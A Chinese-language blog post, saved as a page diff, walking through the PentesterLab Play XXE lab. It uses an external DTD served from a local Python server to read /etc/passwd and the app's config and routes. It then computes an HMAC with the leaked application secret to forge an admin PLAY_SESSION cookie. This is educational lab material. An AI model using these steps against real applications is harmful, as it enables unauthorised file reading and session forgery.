@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Pentester Lab: Play XML Entities | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="给了一个 iso 文件，打开就是 pentester 登录的状态，所以可以直接 ifconfig 去看 ip 地址                                                                                              image.png               访问一下 ip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pentester Lab: Play XML Entities">
+<meta property="og:url" content="https://yichen115.github.io/2020/07/27/mysmtc/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="给了一个 iso 文件，打开就是 pentester 登录的状态，所以可以直接 ifconfig 去看 ip 地址                                                                                              image.png               访问一下 ip">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818224455-23f455a8-cc0c-4306-9800-2381de8f439d.png#align=left&display=inline&height=180&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=748&size=13238&status=done&style=none&width=554">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818545238-6fd0dd76-a566-4521-be5d-4450e084cd22.png#align=left&display=inline&height=296&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1223&size=64195&status=done&style=stroke&width=611.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595835562667-4d6ff2b5-9f29-45de-9b10-5538f56cd3d9.png#align=left&display=inline&height=458&margin=%5Bobject%20Object%5D&name=image.png&originHeight=916&originWidth=1603&size=267033&status=done&style=stroke&width=801.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837327132-0578cf65-33b8-4783-a94f-ff3d242be819.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=image.png&originHeight=97&originWidth=904&size=59833&status=done&style=none&width=722">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837372747-88b1ad06-57d8-4e50-b0b0-1728dbcf4a22.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=1456&size=248335&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837782746-ad72030b-8745-4916-b045-359a1b57ce07.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=124&originWidth=920&size=82870&status=done&style=none&width=601">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839290310-0b4ec631-2b87-4e96-8d7b-ae8d1a65b54f.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1460&size=367966&status=done&style=none&width=730">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839415210-4c9e219c-08df-4eb0-bb27-c0171506b4f7.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=743&size=33976&status=done&style=stroke&width=456">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839604331-330df1a1-62dc-428d-9289-07d3a6fb35b2.png#align=left&display=inline&height=63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=126&originWidth=1450&size=196506&status=done&style=none&width=725">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848668980-0e3e057e-b189-4c41-a26c-43662b07956c.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=897&size=293566&status=done&style=none&width=625">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848875639-8ccf407b-3965-4907-b817-6042c43ed0af.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=377&originWidth=539&size=39216&status=done&style=stroke&width=440">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848893489-5b6c0d17-36ba-4f7a-826a-cfa7618613f8.png#align=left&display=inline&height=327&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1199&size=67063&status=done&style=stroke&width=652">
+<meta property="article:published_time" content="2020-07-27T02:50:20.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.712Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818224455-23f455a8-cc0c-4306-9800-2381de8f439d.png#align=left&display=inline&height=180&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=748&size=13238&status=done&style=none&width=554">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Pentester Lab: Play XML Entities</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Pentester Lab: Play XML Entities</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-07-27T02:50:20.000Z" itemprop="datePublished" class="page-time">
+  2020-07-27
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+
+<article id="post-mysmtc"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Pentester Lab: Play XML Entities</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-07-27 10:50:20" datetime="2020-07-27T02:50:20.000Z"  itemprop="datePublished">2020-07-27</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>给了一个 iso 文件，打开就是 pentester 登录的状态，所以可以直接 ifconfig 去看 ip 地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818224455-23f455a8-cc0c-4306-9800-2381de8f439d.png#align=left&display=inline&height=180&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=748&size=13238&status=done&style=none&width=554" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问一下 ip</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818545238-6fd0dd76-a566-4521-be5d-4450e084cd22.png#align=left&display=inline&height=296&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1223&size=64195&status=done&style=stroke&width=611.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><code>python3 -m http.server 8080</code><br>python 开一个临时的服务，在提交表单的时候改成 xml（Content-Type 要改成 text/xml）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595835562667-4d6ff2b5-9f29-45de-9b10-5538f56cd3d9.png#align=left&display=inline&height=458&margin=%5Bobject%20Object%5D&name=image.png&originHeight=916&originWidth=1603&size=267033&status=done&style=stroke&width=801.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>虽然服务器上没有这个东西，但是它确实去访问了</p>
+<p>接下来就要通过编辑这个 test.dtd 来获得一些东西</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837327132-0578cf65-33b8-4783-a94f-ff3d242be819.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=image.png&originHeight=97&originWidth=904&size=59833&status=done&style=none&width=722" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再去访问的时候就能拿到 /etc/passwd 的信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837372747-88b1ad06-57d8-4e50-b0b0-1728dbcf4a22.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=1456&size=248335&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;sh</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;bin&#x2F;sh</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">tc:x:1001:50:Linux User,,,:&#x2F;home&#x2F;tc:&#x2F;bin&#x2F;sh</span><br><span class="line">pentesterlab:x:1000:50:Linux User,,,:&#x2F;home&#x2F;pentesterlab:&#x2F;bin&#x2F;sh</span><br><span class="line">play:x:100:65534:Linux User,,,:&#x2F;opt&#x2F;play-2.1.3&#x2F;xxe&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:101:65534:Linux User,,,:&#x2F;home&#x2F;mysql:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，play 用户的家目录是 /opt/play-2.1.3/xxe/</p>
+<p>把 test.dtd 改一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837782746-ad72030b-8745-4916-b045-359a1b57ce07.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=124&originWidth=920&size=82870&status=done&style=none&width=601" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后去访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.gitignore</span><br><span class="line">.settings</span><br><span class="line">app</span><br><span class="line">conf</span><br><span class="line">logs</span><br><span class="line">Aproject</span><br><span class="line">public</span><br><span class="line">README</span><br><span class="line">RUNNING_PID</span><br><span class="line">target</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+<p>再看一下 conf<br>application.conf<br>evolutions<br>routes</p>
+<p>在访问 routes 时候</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839290310-0b4ec631-2b87-4e96-8d7b-ae8d1a65b54f.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1460&size=367966&status=done&style=none&width=730" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>解码一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;                           controllers.Application.index()</span><br><span class="line">GET     &#x2F;0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()</span><br><span class="line">GET       &#x2F;login                   controllers.Application.login</span><br><span class="line">POST      &#x2F;login                   controllers.Application.login</span><br><span class="line">GET       &#x2F;logout                  controllers.Application.logout</span><br><span class="line"></span><br><span class="line">GET     &#x2F;assets&#x2F;*file               controllers.Assets.at(path&#x3D;&quot;&#x2F;public&quot;, file)</span><br></pre></td></tr></table></figure>
+
+<p>访问一下<br>/0ecf87346b9c0b370f8d63e6e7fed4f0</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839415210-4c9e219c-08df-4eb0-bb27-c0171506b4f7.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=743&size=33976&status=done&style=stroke&width=456" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再去访问一下 application.conf</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839604331-330df1a1-62dc-428d-9289-07d3a6fb35b2.png#align=left&display=inline&height=63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=126&originWidth=1450&size=196506&status=done&style=none&width=725" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">application.secret&#x3D;&quot;X7G@Abg53&#x3D;2p&#x3D;][5F;uMNDm&#x2F;QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</span><br><span class="line">application.langs&#x3D;&quot;en&quot;</span><br><span class="line">db.default.driver&#x3D;com.mysql.jdbc.Driver</span><br><span class="line">db.default.url&#x3D;&quot;mysql:&#x2F;&#x2F;pentesterlab:pentesterlab@localhost&#x2F;xxe&quot;</span><br><span class="line">ebean.default&#x3D;&quot;models.*&quot;</span><br><span class="line">logger.root&#x3D;ERROR</span><br><span class="line">logger.play&#x3D;INFO</span><br><span class="line">logger.application&#x3D;DEBUG</span><br></pre></td></tr></table></figure>
+
+<p>然后去看一下 framework/src/play/src/main/scala/play/api/mvc/Http.scala，可能太大的原因？并没有返回给我</p>
+<p>通过分析源码计算出 user=admin 应该用的 cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line">key=<span class="string">"X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"</span></span><br><span class="line">data=<span class="string">"user=admin"</span></span><br><span class="line">h=hmac.new(key,data,hashlib.sha1)</span><br><span class="line">h.hexdigest()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848668980-0e3e057e-b189-4c41-a26c-43662b07956c.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=897&size=293566&status=done&style=none&width=625" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后 cookie 改成 PLAY_SESSION=”a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin”</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848875639-8ccf407b-3965-4907-b817-6042c43ed0af.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=377&originWidth=539&size=39216&status=done&style=stroke&width=440" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848893489-5b6c0d17-36ba-4f7a-826a-cfa7618613f8.png#align=left&display=inline&height=327&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1199&size=67063&status=done&style=stroke&width=652" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>参考：<br><a href="https://pentesterlab.com/exercises/play_xxe/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/play_xxe/course</a><br><a href="http://www.beesfun.com/2017/04/21/play渗透框架XXE实体攻击/" target="_blank" rel="noopener">http://www.beesfun.com/2017/04/21/play 渗透框架 XXE 实体攻击/</a></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.712Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/07/27/mysmtc/&title=《Pentester Lab: Play XML Entities》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/07/27/mysmtc/&title=《Pentester Lab: Play XML Entities》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/07/27/mysmtc/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Pentester Lab: Play XML Entities》 — yichen's blog&url=https://yichen115.github.io/2020/07/27/mysmtc/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/07/27/mysmtc/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/08/03/vnkg3q/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Tr0ll:2</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/07/26/mi07k6/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">攻防世界-web</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/07/27/mysmtc/&title=《Pentester Lab: Play XML Entities》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/07/27/mysmtc/&title=《Pentester Lab: Play XML Entities》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/07/27/mysmtc/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Pentester Lab: Play XML Entities》 — yichen's blog&url=https://yichen115.github.io/2020/07/27/mysmtc/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/07/27/mysmtc/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/07/27/mysmtc/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
